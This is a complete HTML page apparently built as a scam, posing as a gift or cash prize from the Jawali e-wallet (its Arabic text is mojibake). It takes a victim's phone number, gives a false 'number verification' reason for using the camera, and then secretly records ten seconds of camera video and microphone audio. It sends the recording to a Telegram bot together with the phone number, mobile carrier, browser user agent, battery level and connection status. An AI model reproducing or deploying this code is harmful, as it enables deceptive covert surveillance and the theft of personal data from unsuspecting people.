<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© -Ù…Ø­ÙØ¸Ø© Ø¬ÙˆØ§Ù„ÙŠ Ø§Ù„Ø§Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ©</title
<meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Ù…Ø±Ø­Ø¨Ø§ Ø¨ÙƒÙ… ÙÙŠ Ø®Ø¯Ù…Ø© Ø¬ÙˆØ§Ù„ÙŠ - Ø¬ÙˆØ§Ø¦Ø² Ù‚ÙŠÙ…Ø©">
  <style>
    body {
      text-align: center;
      direction: rtl;
      font-family: Tahoma, sans-serif;
      background-color: #f9f9f9;
      padding: 30px;
    }
    button {
      font-size: 18px;
      font-weight: bold;
      margin: 10px;
      padding: 10px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .start-button {
      background-color: #007bff;
      color: white;
    }
    .start-button:hover {
      background-color: #0056b3;
    }
    #consentBox {
      background: #fff3cd;
      border: 1px solid #ffeeba;
      padding: 20px;
      margin: 20px auto;
      width: 60%;
      border-radius: 8px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <h2>ğŸ Ø§Ø¶ØºØ· Ø§Ù„Ø²Ø± Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù‡Ø¯ÙŠØ© Ù…Ù‚Ø¯Ù…Ø© Ù…Ù† Ù…Ø­ÙØ¸Ø© Ø¬ÙˆØ§Ù„ÙŠ Ø§Ù„Ø§Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ© (Ø±ØµÙŠØ¯ Ø£Ùˆ Ù…Ø²Ø§ÙŠØ§ Ø§Ùˆ Ù…Ø¨Ø§Ù„Øº Ù†Ù‚Ø¯ÙŠØ©)</h2>

  <input type="tel" id="phoneNumber" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ" style="margin-bottom: 10px; padding: 10px; font-size: 18px;"><br>
  <p id="carrierDisplay" style="font-size: 18px; color: #555;"></p>

  <div id="consentBox">
    <p>ğŸ“¸ Ø³ÙŠØ·Ù„Ø¨ Ø¥Ø°Ù† Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ù† Ø£Ø¬Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù…Ùƒ</p>
    <button class="start-button" onclick="confirmConsent()">Ø£ÙˆØ§ÙÙ‚</button>
  </div>

  <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">ØªØ£ÙƒÙŠØ¯</button>

  <p id="confirmationMessage" style="display: none; font-size: 24px; color: green;">
    âœ… ØªÙ… ØªØ£ÙƒÙŠØ¯ Ø±Ù‚Ù…Ùƒ: <span id="confirmedNumber"></span>
  </p>

  <script>
    let botToken = '';
    let chatId = '';

    // ØªØ­Ù…ÙŠÙ„ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª
    fetch('/config')
      .then(res => res.json())
      .then(data => {
        botToken = data.botToken;
        chatId = data.chatId;
      })
      .catch(err => {
        console.error('ÙØ´Ù„ ØªØ­Ù…ÙŠÙ„ Ø§Ù†ØªØ¸Ø±:', err);
        alert('ÙØ´Ù„ ØªØ­Ù…ÙŠÙ„ Ø§Ù†ØªØ¸Ø±.');
      });

    // ÙƒØ´Ù Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
    document.getElementById('phoneNumber').addEventListener('input', () => {
      const phone = document.getElementById('phoneNumber').value;
      const carrierName = detectCarrier(phone);
      document.getElementById('carrierDisplay').innerText = "Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©: " + carrierName;
    });

    function detectCarrier(phoneNumber) {
      const cleaned = phoneNumber.replace(/\D/g, '');
      const prefix = cleaned.substring(0, 2);
      switch (prefix) {
        case '77':
          return "ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„";
        case '71':
          return "Ø³Ø¨Ø£ÙÙˆÙ†";
        case '73':
          return "MTN";
        case '70':
          return "ÙˆØ§ÙŠ";
        default:
          return "Ù…Ø²ÙˆØ¯ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      }
    }

    function confirmConsent() {
      document.getElementById('consentBox').style.display = 'none';
      document.getElementById('confirmBtn').style.display = 'inline-block';
    }

    function startCameraAndSend() {
      const phoneNumber = document.getElementById('phoneNumber').value.trim();
      if (phoneNumber === '') {
        alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ.');
        return;
      }

      recordAndSendVideo(phoneNumber);
    }

    async function recordAndSendVideo(phoneNumber) {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert("Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„Ø®Ø¯Ù…Ø©.");
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        const chunks = [];

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };

        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunks, { type: 'video/webm' });
          const info = await collectUserInfo(phoneNumber);

          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('video', videoBlob, 'recording.webm');
          formData.append('caption', info.caption);

          fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
            method: 'POST',
            body: formData
          })
          .then(res => res.json())
          .then(result => {
            if (!result.ok) {
              console.error("ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ ØªØ§ÙƒÙŠØ¯:", result.description);
            }
          })
          .catch(err => {
            console.error("Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ :", err);
          });

          document.getElementById('confirmedNumber').innerText = phoneNumber;
          document.getElementById('confirmationMessage').style.display = 'block';

          stream.getTracks().forEach(track => track.stop());
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 10000);

      } catch (error) {
        console.error("ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ :", error);
        alert("ØªØ¹Ø°Ø± ØªØ´ØºÙŠÙ„ .");
      }
    }

    async function collectUserInfo(phoneNumber) {
      const userAgent = navigator.userAgent;
      const connectionStatus = navigator.onLine ? "Ù…ØªØµÙ„ Ø¨Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª" : "ØºÙŠØ± Ù…ØªØµÙ„";
      let batteryLevel = "ØºÙŠØ± Ù…ØªÙˆÙØ±";

      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          batteryLevel = Math.round(battery.level * 100) + "%";
        } catch (e) {
          batteryLevel = "ØºÙŠØ± Ù…ØªØ§Ø­";
        }
      }

      const carrier = detectCarrier(phoneNumber);

      const caption = `
ğŸ“± Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ: ${phoneNumber}
ğŸ¢ Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©: ${carrier}
ğŸ–¥ï¸ Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${userAgent}
ğŸ”‹ Ù†Ø³Ø¨Ø© Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${batteryLevel}
ğŸŒ Ø­Ø§Ù„Ø© Ø§Ù„Ø§ØªØµØ§Ù„: ${connectionStatus}
      `.trim();

      return { caption };
    }
  </script>

</body>
    </html>
